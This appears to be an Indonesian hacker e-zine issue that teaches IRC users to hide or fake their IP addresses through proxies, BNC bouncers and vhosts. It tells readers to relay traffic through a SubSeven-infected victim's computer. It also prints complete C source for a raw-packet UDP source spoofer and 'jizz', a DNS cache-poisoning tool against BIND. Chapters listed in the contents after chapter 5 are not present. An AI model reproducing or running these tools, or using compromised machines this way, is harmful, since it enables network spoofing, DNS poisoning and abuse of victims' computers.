@@ -1,0 +1,1542 @@
+    	____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       05
+
+Author: basher13 || basher13@stardawn.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+#Include :         
+
+
+  1.Chapter:
+    -.Fake Ip address
+    -.Mendapatkan proxys dan wingates
+    -.Shell providers
+    -.mIRC 
+
+  2.Chapter:
+    -.Spoff  IP melalui mIRC 5.6 
+
+  3.Chapter:
+    -.WinBNC IP spoff
+    -.Subseven trojan
+
+  4.Chapter:
+    -.BNC Spoff
+    -.Linux/Unix spoof
+
+  5.Chapter:
+    -.IRC telnet 
+    -.Fake vhost
+ 
+  6.Chapter:
+    -.IRC Daemon
+    -.Nukes Shell Account (english)
+  7.Chapter:
+    -.Gambaran  Phone Hack tools
+
+
+..#1.Chapter
+*[ Fake  Ip address ].
+
+
+   banyak orang yang selalu bertanya-tanya menggunakan IRC  secara total
+anonymous, bagaimana cara meng-fake alamat IP mereka atau bagaimana
+untuk mendapatkan alamat ip seperti"gates.is.owned.a0l.hax0rz.com ,31337.unixshell.
+com," atau yang unik seperti ini"bahagianya.hatiku.ketika.melihat.kekasihku.
+tersenyum.org".Berikut sedikit
+penjelasannya:
+
+*[ Mendapatkan proxys dan wingates ].
+
+
+ Untuk mempermudah meng-fake alamat ip menggunakan IRC server dengan  proxys dan wingates.
+Letakkan proxys dan wingates tersebut di bagian mIRC port ,jika belum mendapatkan mIRC anda
+bisa menemukannya di situs ini ; http://www.mirc.co.uk atau http://www.mirc.net .Di mIRC progs
+pilih firewall setting (Options -> Connect -> Firewall).Pastikan anda telah menggunakan proxy
+server dan sudah men-check terlebih dahulu "Proxy" protocol,jika menggunakan firewall sock4
+,perhatikan "sock4"protocol dan yang lainnya.
+
+
+ Sekarang anda pasti bertanya dimana harus mendapatkan proxys dan wingates,ini mudah menggunakan
+proxy ketimbang wingates yang terlalu riskan.Untuk mendapatkan proxy list ,cari di situs  "
+http://www.cyberarmy.com/lists/proxy ",atau mudahnya lagi sebaiknya anda mencari di mesin cari
+google.com ( http://www.google.com  ),ketik " proxy list".Pastikan yang anda temukan proxy baik
+wingates harus ditest dahulu untuk memastikan bisa digunakan oleh bounce IRC.
+
+*[ Shell providers ]
+
+  Dalam hal ini anda harus membayar/membeli shell untuk vhost anda .Bagaimana cara untuk menemukan
+'shell atau vhost'?
+Saya saat ini menggunakan shell/vhost dengan harga perbulan Rp.30.000,00 ,untuk shell provider atau
+vhost ,silahkan klik di situs " http://www.unishell.com " atau cari dari 'http://www.yahoo.com ,
+http://www.google.com ",ketik " shell provider".
+
+*[ mIRC ]
+
+ Setelah anda mendapatkan account shell untuk vhost ,buka program mIRC dan connect ke shell provider,
+(/server server2.unishell.com 51121),itu hanya contoh dari shell providers yang saya gunakan ,dengan
+server unishell.com .Port 51121 adalah diamana mereka mempunyai BNC daemon atau psyBNC.
+Selanjutnya Anda akan di perintahkan untuk memberi password ,dengan mengetik /quote pass [password anda]
+..Setelah password anda berikan ,ketik " /bvhost vhost.nama.yang.anda.inginkan.".Dengan mengetik 'JUMP'
+,anda telah mendapatkan IP anda berubah /beralih ke vhost tersebut (mis,basher13@31337.unixshell.com,
+yang sebelumnya basher13@208.37.46.1xx).208.37.46.1xx adalah nomer IP shell provider .selanjutnya
+Ketik di mIRC window dengan "/whois [nama nick anda]".Untuk connect ke IRC server,tulis 'JUMP irc.
+server.com 6667',tekan 'enter',untuk connect.
+
+
+=========================================================================================
+mIRC							                                |
+=========================================================================================
+-Welcome to psybnc,You'have IRC Client doesn't support password,please type "quote PASS "
+to connect.
+
+
+
+
+--> ketik " /quote pass [password anda] "
+
+<-- psyBNC 'password accepted'
+
+-->ketik " /bvhost vhost.nama.yang.anda.inginkan "
+
+<-- psyBNC " vhost has changed to  vhost.nama.yang.anda.inginkan ,JUMP to changed sever"
+
+--->ketik " JUMP"
+
+
+<-- psyBNC "host has changed to basher13@31377.unixshell.com "
+
+
+
+--->ketik "/whois basher13 "
+
+<--- Chanserv " basher13 is basher13@31337.unixshell.com
+                Has using irc.webmaster.com
+                His identify him self
+                has idle in 12 minutes , 3 seconds
+                End whois "
+
+
+
+
+==========================================================================================
+
+
+
+
+
+
+..#2.Chapter
+*[ Spoff  IP melalui mIRC 5.6]
+
+
+ Buka program mIRC anda ,pilih 'option menu' untuk setting firewall ( ALT + O).
+Lihat di katogorie " + connect",klik untuk membuka firewall setting.Pilih sub-item 'firewall',
+pastikan anda sudah men-check terlebih dahulu box ' Use SOCKS firewall',(x).
+Di kotak 'hostname',ketik IP/firewall hostname ,contoh firewall.yangpunya.com.
+Biarkan kotak USER ID dan PASSWORD kosong dan portnya 1080 ,klik 'ok'.Selanjutnya ketik '/server..
+yang.anda.mau 6667 '.
+
+
+:localhost 311 ^FBI^ ^FBI^ ~FBI firewall.someone.com * : basher 13
+:localhost 312 ^FBI^ ^FBI^ localhost :test server
+:localhost 317 ^FBI^ ^FBI^ 9 932030074 :seconds idle, signon time
+:localhost 318 ^FBI^ ^FBI^ :End of /WHOIS list.
+
+
+ Sekarang anda lihat bahwa saya host saya berubah menjadi firewall.someone.com yang sebelumnya
+ialah 31337.unixshell.com.Untuk mendapatkan firewall list ,caoba temukan di Astalavista (http://
+www.astalavista.com ),atau di mesincari google.com,yahoo.com ,dll dengan mengetik "firewall list".
+
+
+:localhost 311 ^FBI^ ^FBI^ ~FBI firewall.someone.com * : basher 13
+:localhost 312 ^FBI^ ^FBI^ localhost :test server
+:localhost 317 ^FBI^ ^FBI^ 9 932030074 :seconds idle, signon time
+:localhost 318 ^FBI^ ^FBI^ :End of /WHOIS list.
+
+
+Penjelasan mengenai line  yang ada sperti di atas:
+
+~FBI 31337.unixhsell.com * :basher13
+  |     |                         |_ Nama asal sang user
+  |     |_ User host atau IP
+  |_ Username (set oleh IdentD).
+
+line yang kedua:
+localhost :test server
+    |             |_ pesan oleh server (set oleh server admin)
+    |_ Server yang digunakan untuk connect
+
+Line yang ketiga:
+9 932030074 :seconds idle, signon time
+|      |_Sang User signed in /login ke server
+|_ Berapa waktu sang user berada di server tersebut
+
+line terakahir:
+:End of /WHOIS list.
+     |_ Menampilkan bahwa data sudah tidak ada.
+
+
+
+Dimana jika alamat IP anda telh diketahui,bisa mengakibatkan sang penyerang
+membuat Denial of Service (DoS),seperti winnkue,ComNUKE,atau lovely ping flood
+yang dapat mengakibatkan sebuah bandwhit melebihi kapasitasnya atau mereboot ulang
+komputer anda.
+
+..#3.Chapter
+*[ WinBNC IP spoff ]
+
+
+Anda harus mempunyai partner/teman untuk bounce IP mereka  melalui IRC.Manakala mereka
+harus mempunyai WinBNC daemon software(Jika operating system mereka  lain dari
+windows,sangat dibutuhkan BNC, ezBNC etc ).Daemon dibuat untuk jenis platform lain,
+anda bisa connect melalui komputer dan alamat ip mereka.Cari di situs yang menyediakan
+search engine /mesin cari (www.google.com,www.yahoo.com)'ketik "winbnc etc".Sebelum teman
+anda menggunakan daemon anda harus jelsa akan port,password dan admin password,hal ini
+akan direkomendasikan akan spesifikasi list dari IP/DNS,yand berguna bagi BNC (list harus
+sudah termasuk dengan IP anda,bisa  langsung connect ke BNC teman/partner).konfigurasi ini
+di edit melalui bnc.cfg dengan notepad atau text-editor.Sekarang suruh partner/teman anda
+membuka MS-DOS prompt dan pergi ke directory dimana WinBNC sudah unzipped,dan selanjutnya
+ke bnc.exe.Dan mereka akan memberi alamat IP ,WinBNC password dan post.Dimana anda akan
+menggunakan value tersebut untuk IRC,mis;
+
+/server 144.64.24.100 namaport password
+
+Setelah anda connect ke partner/teman WinBNC,type atau ketik /quote conn irc.nama.server
+ircserversport password
+(dan pastikan juga teman anda tidak mempunyai vhost,jadi anda bisa connect melalui IP)
+
+
+*[ Subseven trojan ]
+
+
+ Cara lain untk meng-spoff IP anda adalah menggunakan Subseven trojan,disini akan digunakan
+untuk meng-direct semua data dari asalnya,(mis;IRC server),yang dipastikan tidak akan terjadi
+suatu kominikasi antara anda dan hanya terjadi oleh korban dari SubSeven .Setelah anda mendapatkan
+SubSeven dari si korban ,anda harus connect lewat SubSeven klient dan set up ke port redirect.
+Anda haru mengisi input port, output port dan output host.input port ialah port dimana anda connect
+ke IRC,outport ialah port IRC server,dan output host adalah akhir dari port server yang digunakan
+untuk connect.Ketik input port '2000' ,outport ketik '6667',dan output host ketik 'server.yang.dituju'.
+mis;irc.webmaster.com.
+
+
+ Sekarang anda sudah selasi dengan Subseven,tutup dan buka progrms IRC klient anda.
+Ketik beberapa command :/server sub7korbanip inputportyangandatahu (for ex. /server 212.213.100.2 2000)
+..Anda sudah rehubung ke IRC dan connect melalui Subseven korban untuk membuat IP berubah/hide,caranya
+,ketik di main windows IRC /mIRC dengan :/whois nama anda
+
+..#4.chapter
+*[ WinBNC ]
+
+
+
+ BNC adalah sebuah software yang menggunakan Unix komputer.Contohnya ada sebuah
+BNC di bnc.shell.com  port 1234,yang anda lakukan ialah mengetik /server bnc.shell.com 1234
+seperti;
+
+-BNC- Please type your password via /quote pass <password>
+
+Duh...passwordnya apa?,jika anda sudah mengetahui/mempunyai password tersebut dengan mengetik
+'/qoute pass password'.Jika tidak mempunyai password ,minta kepada mereka yang memiliki BNC,dan
+juga menanyakan apakah mereka mempunyai vhost,jika ada ,anda tinggal ketik '/quote vip nama.host.anda'
+Tulis atau ketik /conn irc.nama.server ,untuk connect ke server yang dituju.
+
+
+*[ Linux/Unix spoff ]
+
+ Yang anda perlukan ialah compile semua untuk linux/Unix.
+
+1.Arnudp.c
+
+
+// kirim sebuah udp datagram dengan source/destination address/port
+// Jika tidak terdapat kemungkinan IP_HDRINCL config, alamat source akan
+// set ke alamat aslinya.  Ini akan bekerja di SunOS 5.4.   */
+// Seharusnya compile dengan baik bersama ANSI compiler (seperti gcc)dibawah
+
+// Linux dan SunOS 4.1, tapi dengan SunOS 5.4 anda harus memperhatikan
+// libraries di command line:
+//          /usr/ucb/cc -o arnudp arnudp001.c -lsocket -lnsl
+// Ini akan bekerja sebagai root!
+
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in_systm.h>
+#include<netinet/in.h>
+#include<netinet/ip.h>
+#include<netinet/udp.h>
+#include<errno.h>
+#include<string.h>
+#include<netdb.h>
+#include<arpa/inet.h>
+#include<stdio.h>
+
+struct sockaddr sa;
+
+main(int argc,char **argv)
+{
+int fd;
+int x=1;
+struct sockaddr_in *p;
+
+struct hostent *he;
+u_char gram[38]=
+        {
+        0x45,   0x00,   0x00,   0x26,
+        0x12,   0x34,   0x00,   0x00,
+        0xFF,   0x11,   0,      0,
+        0,      0,      0,      0,
+        0,      0,      0,      0,
+
+        0,      0,      0,      0,
+        0x00,   0x12,   0x00,   0x00,
+
+        '1','2','3','4','5','6','7','8','9','0'
+        };
+
+if(argc!=5)
+
+        {
+        fprintf(stderr,"usage: %s sourcename sourceport destinationname destinationport\n",*argv);
+        exit(1);
+        };
+
+if((he=gethostbyname(argv[1]))==NULL)
+        {
+        fprintf(stderr,"can't resolve source hostname\n");
+        exit(1);
+        };
+bcopy(*(he->h_addr_list),(gram+12),4);
+
+if((he=gethostbyname(argv[3]))==NULL)
+        {
+        fprintf(stderr,"can't resolve destination hostname\n");
+
+        exit(1);
+        };
+bcopy(*(he->h_addr_list),(gram+16),4);
+
+*(u_short*)(gram+20)=htons((u_short)atoi(argv[2]));
+*(u_short*)(gram+22)=htons((u_short)atoi(argv[4]));
+
+p=(struct sockaddr_in*)&sa;
+p->sin_family=AF_INET;
+bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));
+
+if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
+        {
+        perror("socket");
+        exit(1);
+
+        };
+
+#ifdef IP_HDRINCL
+fprintf(stderr,"we have IP_HDRINCL :-)\n\n");
+if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
+        {
+        perror("setsockopt IP_HDRINCL");
+        exit(1);
+        };
+#else
+fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
+#endif
+
+if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)
+
+        {
+        perror("sendto");
+        exit(1);
+        };
+
+printf("datagram sent without error:");
+for(x=0;x<(sizeof(gram)/sizeof(u_char));x++)
+        {
+        if(!(x%4)) putchar('\n');
+        printf("%02x",gram[x]);
+        };
+putchar('\n');
+
+}
+/************************************************************************/
+
+2.Jizz (ip host spoofer)
+
+#define VERSION ".01b"
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <strings.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+
+#define MAXBUFSIZE		64*1024
+
+#define DC_A            1
+
+#define DC_NS           2
+
+#define DC_CNAME        5
+
+#define DC_SOA          6
+
+#define DC_WKS          11
+
+#define DC_PTR          12
+
+#define DC_HINFO        13
+
+#define DC_MINFO        14
+
+#define DC_MX           15
+
+#define DC_TXT          16
+
+typedef struct {
+
+  unsigned short id;
+
+  unsigned char  rd:1;           /* recursion desired */
+
+  unsigned char  tc:1;           /* truncated message */
+
+  unsigned char  aa:1;           /* authoritive answer */
+
+  unsigned char  opcode:4;       /* purpose of message */
+
+  unsigned char  qr:1;           /* response flag */
+
+  unsigned char  rcode:4;        /* response code */
+
+  unsigned char  unused:2;       /* unused bits */
+
+  unsigned char  pr:1;           /* primary server required (non standard) */
+
+  unsigned char  ra:1;           /* recursion available */
+
+  unsigned short qdcount;
+
+  unsigned short ancount;
+
+  unsigned short nscount;
+
+  unsigned short arcount;
+
+} dnsheaderrec;
+
+typedef struct {
+
+  unsigned short labellen;
+
+  char label[256];
+
+  unsigned short type;
+
+  unsigned short class;
+
+  unsigned long ttl;
+
+  unsigned short buflen;
+
+  char buf[256];
+
+} dnsrrrec;
+
+typedef struct {
+
+  dnsheaderrec h;
+
+  dnsrrrec qd[20];
+
+  dnsrrrec an[20];
+
+  dnsrrrec ns[20];
+
+  dnsrrrec ar[20];
+
+} dnsrec;
+
+char *dnssprintflabel(char *s, char *buf, char *p);
+
+char *dnsaddlabel(char *p, char *label);
+
+void dnstxt2rr(dnsrrrec *rr, char *b);
+
+void dnsbuildpacket(dnsrec *dns, short qdcount, short ancount, short nscount, short arcount, ...);
+
+char *dnsaddbuf(char *p, void *buf, short len);
+
+int dnsmakerawpacket(dnsrec *dns, char *buf);
+
+unsigned long rev_long(l) unsigned long l;
+
+{
+
+  unsigned long i = 0;
+
+  int n = sizeof(i);
+
+  while (n--) {
+
+    i = (i << 8) | (l & 255); l >>= 8;
+
+  }
+
+  return i;
+
+}
+
+char *dnssprintflabel(char *s, char *buf, char *p)
+
+{
+
+  unsigned short i,len;
+
+  char *b=NULL;
+
+  len=(unsigned short)*(p++);
+
+  while (len) {
+
+    while (len >= 0xC0) {
+
+      if (!b)
+
+        b=p+1;
+
+      p=buf+(ntohs(*((unsigned short *)(p-1))) & ~0xC000);
+
+      len=(unsigned short)*(p++);
+
+    }
+
+    for (i=0;i<len;i++)
+
+      *(s++)=*(p++);
+
+    *(s++)='.';
+
+    len=(unsigned short)*(p++);
+
+  }
+
+  *(s++)=0;
+
+  if (b)
+
+    return(b);
+
+  return(p);
+
+}
+
+char *dnsaddlabel(char *p, char *label)
+
+{
+
+  char *p1;
+
+  while ((*label) && (label)) {
+
+    if ((*label == '.') && (!*(label+1)))
+
+      break;
+
+    p1=strchr(label,'.');
+
+    if (!p1)
+
+      p1=strchr(label,0);
+
+    *(p++)=p1-label;
+
+    memcpy(p,label,p1-label);
+
+    p+=p1-label;
+
+    label=p1;
+
+    if (*p1)
+
+      label++;
+
+  }
+
+  *(p++)=0;
+
+  return(p);
+
+}
+
+#define DEFAULTTTL 60*10
+
+void dnstxt2rr(dnsrrrec *rr, char *b)
+
+{
+
+  char *tok[20], *p;
+
+  unsigned short numt=0, i;
+
+  static char *buf=NULL;
+
+  if (!buf) {
+
+    if ((buf=malloc(1024)) == NULL) {
+
+      perror("malloc");
+
+      exit(-1);
+
+    }
+
+  }
+
+  strcpy(buf,b);
+
+  p=strtok(buf," \t");
+
+  do {
+
+    tok[numt++]=p;
+
+  } while (p=strtok(NULL," \t"));
+
+  p=dnsaddlabel(rr->label,tok[0]);
+
+  rr->labellen=p-rr->label;
+
+  i=1;
+
+  if (isdigit(*p))
+
+    rr->ttl=htonl(atol(tok[i++]));
+
+   else
+
+    rr->ttl=htonl(DEFAULTTTL);
+
+  if (strcmp(tok[i],"IN") == 0)
+
+    i++;
+
+  rr->class=htons(1);
+
+  if (strcmp(tok[i],"A") == 0) {
+
+    i++;
+
+    rr->type=htons(DC_A);
+
+    if (i < numt) {
+
+      inet_aton(tok[i],rr->buf);
+
+      rr->buflen=4;
+
+    } else
+
+      rr->buflen=0;
+
+    return;
+
+  }
+
+  if (strcmp(tok[i],"CNAME") == 0) {
+
+    i++;
+
+    rr->type=htons(DC_CNAME);
+
+    if (i < numt) {
+
+      p=dnsaddlabel(rr->buf,tok[i]);
+
+      rr->buflen=p-rr->buf;
+
+    } else
+
+      rr->buflen=0;
+
+    return;
+
+  }
+
+  if (strcmp(tok[i],"NS") == 0) {
+
+    i++;
+
+    rr->type=htons(DC_NS);
+
+    if (i < numt) {
+
+      p=dnsaddlabel(rr->buf,tok[i]);
+
+      rr->buflen=p-rr->buf;
+
+    } else
+
+      rr->buflen=0;
+
+    return;
+
+  }
+
+  if (strcmp(tok[i],"PTR") == 0) {
+
+    i++;
+
+    rr->type=htons(DC_PTR);
+
+    if (i < numt) {
+
+      p=dnsaddlabel(rr->buf,tok[i]);
+
+      rr->buflen=p-rr->buf;
+
+    } else
+
+      rr->buflen=0;
+
+    return;
+
+  }
+
+  if (strcmp(tok[i],"MX") == 0) {
+
+    i++;
+
+    rr->type=htons(DC_MX);
+
+    if (i < numt) {
+
+      p=rr->buf;
+
+      *((unsigned short *)p)=htons(atoi(tok[i++])); p+=2;
+
+      p=dnsaddlabel(p,tok[i]);
+
+      rr->buflen=p-rr->buf;
+
+    } else
+
+      rr->buflen=0;
+
+    return;
+
+  }
+
+}
+
+void dnsbuildpacket(dnsrec *dns, short qdcount, short ancount, short nscount, short arcount, ...)
+
+{
+
+  int i;
+
+  va_list va;
+
+  dns->h.qdcount=htons(qdcount);
+
+  dns->h.ancount=htons(ancount);
+
+  dns->h.nscount=htons(nscount);
+
+  dns->h.arcount=htons(arcount);
+
+  dns->h.rcode=0;
+
+  va_start(va, arcount);
+
+  for (i=0;i<qdcount;i++)
+
+    dnstxt2rr(&dns->qd[i],va_arg(va, char *));
+
+  for (i=0;i<ancount;i++)
+
+    dnstxt2rr(&dns->an[i],va_arg(va, char *));
+
+  for (i=0;i<nscount;i++)
+
+    dnstxt2rr(&dns->ns[i],va_arg(va, char *));
+
+  for (i=0;i<arcount;i++)
+
+    dnstxt2rr(&dns->ar[i],va_arg(va, char *));
+
+  va_end(va);
+
+}
+
+char *dnsaddbuf(char *p, void *buf, short len)
+
+{
+
+  memcpy(p,buf,len);
+
+  return(p+len);
+
+}
+
+int dnsmakerawpacket(dnsrec *dns, char *buf)
+
+{
+
+  char *p;
+
+  int i;
+
+  unsigned short len;
+
+  memcpy(buf,&dns->h,sizeof(dnsheaderrec));
+
+  p=buf+sizeof(dnsheaderrec);
+
+  /********** Query ***********/
+
+  for (i=0;i<ntohs(dns->h.qdcount);i++) {
+
+    p=dnsaddbuf(p,dns->qd[i].label,dns->qd[i].labellen);
+
+    p=dnsaddbuf(p,&dns->qd[i].type,2);
+
+    p=dnsaddbuf(p,&dns->qd[i].class,2);
+
+  }
+
+  /********** Answer ***********/
+
+  for (i=0;i<ntohs(dns->h.ancount);i++) {
+
+    p=dnsaddbuf(p,dns->an[i].label,dns->an[i].labellen);
+
+    p=dnsaddbuf(p,&dns->an[i].type,2);
+
+    p=dnsaddbuf(p,&dns->an[i].class,2);
+
+    p=dnsaddbuf(p,&dns->an[i].ttl,4);
+
+    len=htons(dns->an[i].buflen);
+
+    p=dnsaddbuf(p,&len,2);
+
+    p=dnsaddbuf(p,dns->an[i].buf,dns->an[i].buflen);
+
+  }
+
+  /********** Nameservers ************/
+
+  for (i=0;i<ntohs(dns->h.nscount);i++) {
+
+    p=dnsaddbuf(p,dns->ns[i].label,dns->ns[i].labellen);
+
+    p=dnsaddbuf(p,&dns->ns[i].type,2);
+
+    p=dnsaddbuf(p,&dns->ns[i].class,2);
+
+    p=dnsaddbuf(p,&dns->ns[i].ttl,4);
+
+    len=htons(dns->ns[i].buflen);
+
+    p=dnsaddbuf(p,&len,2);
+
+    p=dnsaddbuf(p,dns->ns[i].buf,dns->ns[i].buflen);
+
+  }
+
+  /********** Additional ************/
+
+  for (i=0;i<ntohs(dns->h.arcount);i++) {
+
+    p=dnsaddbuf(p,dns->ar[i].label,dns->ar[i].labellen);
+
+    p=dnsaddbuf(p,&dns->ar[i].type,2);
+
+    p=dnsaddbuf(p,&dns->ar[i].class,2);
+
+    p=dnsaddbuf(p,&dns->ar[i].ttl,4);
+
+    len=htons(dns->ar[i].buflen);
+
+    p=dnsaddbuf(p,&len,2);
+
+    p=dnsaddbuf(p,dns->ar[i].buf,dns->ar[i].buflen);
+
+  }
+
+  return(p-buf);
+
+}
+
+void main(int argc, char *argv[])
+
+{
+
+  int sock, fromlen, numread, len, query;
+
+  struct sockaddr_in sa, from, to;
+
+  struct in_addr rev;
+
+  char *buf, *sendbuf;
+
+  char *domainnamebuf;
+
+  dnsheaderrec *dns;
+
+  char *p;
+
+  dnsrec dnsh;
+
+  char *beginhost_QD, *beginhost_A, *beginhost_srch;
+
+  char *fakenshost_A, *fakens_DOM;
+
+  char *spoofedip_A, *spoofedip_PTR, *spoofedip_rev;
+
+  printf("jizz %s -- dns spoofer (BIND cache vuln.)\n",VERSION);
+
+  printf("by nimrood\n\n");
+
+  if (argc != 7) {
+
+    printf("usage: \n%s <beginhost> <fakenshost> <fakensip> <fakensdom> <spoofedip> <spoofedhost>\n",argv[0]);
+
+    printf("    beginhost  :     requested to initiate false caching, ex: begin.ib6ub9.com\n");
+
+    printf("    fakenshost :     server name to answer false PTR's, ex: ns.ib6ub9.com\n");
+
+    printf("    fakensip   :     IP of server name to answer false PTR's, ex: 205.160.29.19\n");
+
+    printf("    fakensdom  :     domain name false name server controls, ex: ib6ub9.com\n");
+
+    printf("    spoofedip  :     IP of machine you want to spoof from, ex: 204.154.2.93\n");
+
+    printf("    spoofedhost:     name you want to spoof, ex: teak.0wns.j00\n\n");
+
+    exit(-1);
+
+  }
+
+  if ((beginhost_QD = malloc((strlen(argv[1]))+5+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((beginhost_A = malloc(strlen(argv[1])+15+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((beginhost_srch = malloc(strlen(argv[1])+1+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((fakenshost_A = malloc(strlen(argv[2])+strlen(argv[3])+6+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((fakens_DOM = malloc(strlen(argv[4])+strlen(argv[2])+4+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((spoofedip_A = malloc(strlen(argv[6])+strlen(argv[5])+6+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((spoofedip_PTR = malloc(strlen(argv[5])+strlen(argv[6])+21+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((spoofedip_rev = malloc(strlen(argv[5])+1)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((buf = malloc(MAXBUFSIZE)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((sendbuf = malloc(MAXBUFSIZE)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((domainnamebuf = malloc(MAXBUFSIZE)) == NULL) {
+
+    perror("malloc");
+
+    exit(-1);
+
+  }
+
+  if ((sock=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
+
+    perror("socket");
+
+    exit(-1);
+
+  }
+
+  beginhost_QD = strcpy(beginhost_QD,argv[1]);
+
+  beginhost_QD = strcat(beginhost_QD, " IN A");
+
+  beginhost_A = strcat(strcpy(beginhost_A,beginhost_QD), " 127.0.0.1");
+
+  
+
+  beginhost_srch = strcat(strcpy(beginhost_srch,argv[1]), ".");
+
+  printf("%s\n",beginhost_srch);
+
+  fakenshost_A = strcat(strcpy(fakenshost_A,argv[2]), " IN A ");
+
+  fakenshost_A = strcat(fakenshost_A, argv[3]);
+
+  fakens_DOM = strcat(strcpy(fakens_DOM,argv[4]), " IN NS ");
+
+  fakens_DOM = strcat(fakens_DOM,argv[2]);
+
+  spoofedip_A = strcat(strcpy(spoofedip_A,argv[6]), " IN A ");
+
+  spoofedip_A = strcat(spoofedip_A,argv[5]);
+
+  rev.s_addr = rev_long(inet_addr(argv[5]));
+
+  spoofedip_PTR = strcat(strcpy(spoofedip_PTR,(char *)inet_ntoa(rev.s_addr)), ".IN-ADDR.ARPA IN PTR ");
+
+  spoofedip_PTR = strcat(spoofedip_PTR,argv[6]);
+
+  
+
+  printf("%s\n%s\n%s\n%s\n%s\n%s\n",
+	beginhost_QD,beginhost_A,fakenshost_A,fakens_DOM,spoofedip_A,spoofedip_PTR);
+
+  sa.sin_family = AF_INET;
+
+/*  sa.sin_addr.s_addr = inet_addr(DEFAULTBINDHOST); */
+
+  sa.sin_addr.s_addr = INADDR_ANY;
+
+  sa.sin_port = htons(53);
+
+  
+
+  if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+
+    perror("bind");
+
+    exit(-1);
+
+  }
+
+  setvbuf(stdout,NULL,_IONBF,0);
+
+  while (1) {
+
+    fromlen=sizeof(from);
+
+    if ((numread = recvfrom(sock, buf, MAXBUFSIZE, 0, (struct sockaddr *)&from, &fromlen)) < 0) {
+
+      perror("recvfrom");
+
+      continue;
+
+    }
+
+    /* Kludge to stop that damn router */
+
+    if (from.sin_addr.s_addr == inet_addr("206.126.32.10"))
+
+      continue;
+
+    dns=(dnsheaderrec *)buf;
+
+    if (dns->qr)
+
+      continue;
+
+    p=dnssprintflabel(domainnamebuf,buf,&buf[sizeof(dnsheaderrec)]);
+
+    query=ntohs(*(unsigned short *)p);
+
+    printf("Packet from %s : %d : %s (%d)\n",inet_ntoa(from.sin_addr),ntohs(from.sin_port),domainnamebuf,query);
+
+    if (strcasecmp(domainnamebuf,beginhost_srch) == 0) {
+
+      dnsbuildpacket(&dnsh,1,4,1,1,
+	beginhost_QD,
+
+beginhost_A,
+	spoofedip_A,
+	spoofedip_PTR,
+
+ 	fakenshost_A,
+
+        fakens_DOM,
+
+"www.yahoo.com IN A 255.255.255.255");
+
+    } else {
+
+      /* Error */
+
+      dnsh.h.rcode=5;
+
+      strcat(domainnamebuf," IN A");
+
+      dnsbuildpacket(&dnsh,1,0,0,0,
+
+    	domainnamebuf);
+
+    }
+
+    dnsh.qd[0].type=htons(query);
+
+    dnsh.h.id=((dnsheaderrec *)buf)->id;
+
+    dnsh.h.qr=1;
+
+    dnsh.h.aa=1;
+
+    
+
+    len=dnsmakerawpacket(&dnsh,sendbuf);
+
+    to.sin_family=AF_INET;
+
+    to.sin_addr.s_addr=from.sin_addr.s_addr;
+
+    to.sin_port=from.sin_port;
+
+    if (sendto(sock,sendbuf,len,0,(struct sockaddr *)&to,sizeof(to)) < 0) {
+
+      perror("sendto");
+
+      continue;
+
+    }
+
+  }
+
+}
+
+
+
+
+
+
+
+
+..#5.Chapter
+*[ IRC Telnet  ]
+
+
+  buka telnet anda atau ketik 'telnet 'yang terdapat di 'run',pilih 'start'.
+
+
+
+
+
+==============================================================================
+
+==============================================================================
+
+Welcome to Microsoft Telnet Client
+
+Escape Character is 'CTRL+]'
+
+Microsoft Telnet> o
+( to ) irc.namaserver.com :6667
+Connecting To irc.webmaster.com...
+Connected
+Microsoft Telnet>
+--> ketik'Nick' untuk setting nama nick anda
+-->ketik "USER username host server",nama asli anda , host dan server yang digunakan untuk
+connect.
+
+* nick ^basher13^
+NOTICE ^basher13^ :*** If you are having problems connecting due to ping timeouts,
+please type /notice E3AA3478 nospoof now.
+PING :E3AA3478
+* user ^basher13^ 127.0.0.1 localhost :The Cyber God
+:localhost 001 ^basher13^ :Welcome to the DALnet IRC Network ^basher13^!~basher13@31337.unixshell.com
+:localhost 002 ^basher13^ :Your host is localhost[31337.unixshell.com], running version dal4.6.7.DreamForge.win32
+:localhost 003 ^basher13^ :This server was created Fri Jul 24 07:48:52 1998
+:localhost 004 ^basher13^ localhost dal4.6.7.DreamForge.win32 oiwsghOkcfrRaAb biklmnopstvR
+:localhost 005 ^basher13^ NOQUIT TOKEN WATCH=128 SAFELIST :are available on this server
+:localhost 251 ^basher13^ :There are 0 users and 0 invisible on 1 servers
+:localhost 253 ^basher13^ 4 :unknown connection(s)
+:localhost 255 ^basher13^ :I have 0 clients and 0 servers
+:localhost 265 ^basher13^ :Current local users: 0  Max: 0
+:localhost 266 ^basher13^ :Current global users: 0  Max: 0
+:localhost 422 ^basher13^ :MOTD File is missing
+:^basher13^ MODE ^basher13^ :+iw
+....
+
+ok
+
+
+==============================================================================
+
+
